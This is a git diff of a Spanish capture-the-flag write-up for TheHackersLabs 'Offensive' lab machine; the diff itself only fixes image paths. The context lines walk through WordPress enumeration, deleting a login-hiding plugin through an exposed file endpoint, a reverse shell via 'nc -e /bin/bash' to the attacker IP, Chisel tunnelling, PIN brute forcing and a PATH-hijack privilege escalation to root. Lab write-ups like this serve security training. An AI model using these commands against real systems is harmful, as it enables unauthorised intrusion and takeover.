@@ -94,7 +94,7 @@ http://192.168.0.38 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPS
 
 El servicio web es bastante simple y no contiene mucha información relevante, más allá del título que proporciona el nombre del dominio.
 
-![](assets/img/thl-writeup-offensive/offensive1_1.png)
+![](/assets/img/thl-writeup-offensive/offensive1_1.png)
 
 ```terminal
 /home/kali/Documents/thl/offensive:-$ echo '192.168.0.38\toffensive.thl' | tee -a /etc/hosts
@@ -106,7 +106,7 @@ A partir del escaneo con WhatWeb, detecto que el servicio está utilizando WordP
 /home/kali/Documents/thl/offensive:-$ wpscan --url http://offensive.thl --enumerate u
 ```
 
-![](assets/img/thl-writeup-offensive/offensive1_2.png)
+![](/assets/img/thl-writeup-offensive/offensive1_2.png)
 
 ```terminal
 /home/kali/Documents/thl/offensive:-$ dirb http://offensive.thl/
@@ -167,7 +167,7 @@ A partir del escaneo con WhatWeb, detecto que el servicio está utilizando WordP
 
 El fuzzing revela múltiples rutas interesantes, pero lo más llamativo es la presencia de una imagen `wp-login.jpg` dentro del directorio `images`.
 
-![](assets/img/thl-writeup-offensive/offensive1_3.png)
+![](/assets/img/thl-writeup-offensive/offensive1_3.png)
 
 ---
 
@@ -216,7 +216,7 @@ Cuento con la posible credencial `administrator`:`uF********************a5`. Per
 
 A continuación, prosigo con el análisis del puerto 8080. A primera vista, no encuentro nada relevante en el servicio web.
 
-![](assets/img/thl-writeup-offensive/offensive1_4.png)
+![](/assets/img/thl-writeup-offensive/offensive1_4.png)
 
 Sin embargo, al fuzzear el sitio, descubro que se aceptan varios endpoints que permiten ver y manipular el contenido del directorio `/var/www`.
 
@@ -231,7 +231,7 @@ ID           Response   Lines    Word       Chars       Payload
 000004628:   500        0 L      5 W        45 Ch       "rm"
 ```
 
-![](assets/img/thl-writeup-offensive/offensive1_5.png)
+![](/assets/img/thl-writeup-offensive/offensive1_5.png)
 
 Estos endpoints permiten listar y manipular archivos en `/var/www`. Por ejemplo, puedo listar los plugins instalados en WordPress.
 
@@ -239,7 +239,7 @@ Estos endpoints permiten listar y manipular archivos en `/var/www`. Por ejemplo,
 /home/kali/Documents/thl/offensive:-$ curl -s http://offensive.thl:8080/ls\?path\=wordpress/wp-content/plugins | jq
 ```
 
-![](assets/img/thl-writeup-offensive/offensive1_6.png)
+![](/assets/img/thl-writeup-offensive/offensive1_6.png)
 
 Entre los plugins, identifico que `wps-hide-login` es el que impide el acceso al formulario de inicio de sesión, para solucionarlo, lo elimino.
 
@@ -252,16 +252,16 @@ Entre los plugins, identifico que `wps-hide-login` es el que impide el acceso al
 
 Con esta acción, ya puedo acceder al formulario e iniciar sesión como el usuario `administrator`.
 
-![](assets/img/thl-writeup-offensive/offensive1_7.png)
-![](assets/img/thl-writeup-offensive/offensive1_8.png)
+![](/assets/img/thl-writeup-offensive/offensive1_7.png)
+![](/assets/img/thl-writeup-offensive/offensive1_8.png)
 
 ---
 ## Foothold
 
 Una vez dentro del panel de administración, identifico en la pestaña de plugins que `wpterm` está instalado y activo.
 
-![](assets/img/thl-writeup-offensive/offensive2_1.png)
-![](assets/img/thl-writeup-offensive/offensive2_2.png)
+![](/assets/img/thl-writeup-offensive/offensive2_1.png)
+![](/assets/img/thl-writeup-offensive/offensive2_2.png)
 
 Con esta herramienta, soy capaz de ejecutar comandos de forma remota y establecer una conexión inversa hacia mi máquina de atacante.
 
@@ -304,7 +304,7 @@ Como usuario `www-data`, identifico un servicio interno corriendo en el puerto 5
 www-data@TheHackersLabs-Offensive:/var/www/wordpress$ ss -tulnp
 ```
 
-![](assets/img/thl-writeup-offensive/offensive3_1.png)
+![](/assets/img/thl-writeup-offensive/offensive3_1.png)
 
 Para interactuar con este servicio, descargo la Chisel y redirijo el puerto 5000 a mi maquina.
 
@@ -321,7 +321,7 @@ www-data@TheHackersLabs-Offensive:/tmp$ ./chisel_1.10.1_linux_amd64 client 192.1
 
 Posteriormente, encuentro un panel de login que ya tiene las credenciales precargadas, pero requiere un PIN de 4 dígitos para continuar.
 
-![](assets/img/thl-writeup-offensive/offensive3_2.png)
+![](/assets/img/thl-writeup-offensive/offensive3_2.png)
 
 En lugar de utilizar el Intruder de Burp Suite, ejecuto un script en Python para forzar la búsqueda del PIN.
 
@@ -374,7 +374,7 @@ El PIN obtenido es válido, lo que me permite pasar el panel.
 
 Continuo analizando el entorno y descubro que el servicio parece contar con una herramienta que permite ejecutar comandos con privilegios del usuario `maria`.
 
-![](assets/img/thl-writeup-offensive/offensive4_1.png)
+![](/assets/img/thl-writeup-offensive/offensive4_1.png)
 
 ```terminal
 /home/kali/Documents/thl/offensive:-$ nc -lnvp 4322
@@ -384,7 +384,7 @@ Continuo analizando el entorno y descubro que el servicio parece contar con una 
 Puedo establecer una conexión hacia mi máquina usando netcat mediante el comando:
 * `nc -e /bin/bash 192.168.0.171 4322`.
 
-![](assets/img/thl-writeup-offensive/offensive4_2.png)
+![](/assets/img/thl-writeup-offensive/offensive4_2.png)
 
 ```terminal
 	... connect to [192.168.0.171] from (UNKNOWN) [192.168.0.38] 56364
@@ -408,7 +408,7 @@ maria@TheHackersLabs-Offensive:~$ ls -al app
 maria@TheHackersLabs-Offensive:~$ ./app
 ```
 
-![](assets/img/thl-writeup-offensive/offensive5_1.png)
+![](/assets/img/thl-writeup-offensive/offensive5_1.png)
 
 Para entender cómo opera, ejecuto strings en el binario y filtro las cadenas relacionadas con "shadow".
 
@@ -437,7 +437,7 @@ Al ejecutarlo el binario, el programa utiliza mi script `head` y lanza `bash -p`
 maria@TheHackersLabs-Offensive:~$ ./app
 ```
 
-![](assets/img/thl-writeup-offensive/offensive5_2.png)
+![](/assets/img/thl-writeup-offensive/offensive5_2.png)
 
 ```
 root@TheHackersLabs-Offensive:~# cat /root/root.txt
